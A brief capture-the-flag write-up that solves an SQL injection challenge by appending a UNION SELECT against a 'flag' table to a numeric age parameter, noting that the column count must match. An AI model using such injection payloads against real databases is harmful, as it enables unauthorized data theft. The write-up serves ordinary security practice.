1st of all we need 2 understand what sort of request is there:
Query: SELECT * FROM age WHERE age=

Task:

Find out how many years you have left to live
Flag is in flag table.

All is pretty ez. 
If you still cant do something like this just look my another rep:

Request:
SELECT * FROM age WHERE age=228 union select flag,2,3 from flag

flag,2,3 because num of columns.
